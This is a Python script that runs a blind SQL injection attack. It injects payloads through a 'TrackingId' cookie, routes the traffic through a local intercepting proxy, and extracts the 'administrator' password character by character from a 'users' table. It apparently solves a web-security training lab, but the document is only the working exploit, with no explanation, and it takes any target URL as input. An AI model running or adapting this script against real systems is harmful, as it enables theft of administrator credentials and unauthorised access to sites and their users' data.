import requests
import sys
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}



def sqli_password(url):
    password = ""
    for i in range(1,21):
        for j in range (32,126):
            sqli_payload = "'  and  (select ascii(substring(password,%s,1)) from users where username='administrator' and length (password) >1)='%s"%(i,j)
            sqli_payload_encoded=urllib.parse.quote(sqli_payload)
            cookies = {"TrackingId": "PhReDGgrmh9VWr41"+sqli_payload_encoded, "session":"hDyYCWu4jd3rlXKHZVce4rguKq05Racu"}
            r=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r'+password + chr(j))
                sys.stdout.flush()
            else:
                password+=chr(j)
                sys.stdout.write('\r'+password)
                sys.stdout.flush
                break


def main():
    try:
        print("[+] Retreiving administrator password ...")
        url = sys.argv[1]
        sqli_password(url)
    except IndexError:
        print('[-] usage %s <url>'%sys.argv[0])
        print("[-] usage %s www.example.com"%sys.argv[0])
       
        
       




if __name__=="__main__":
    main()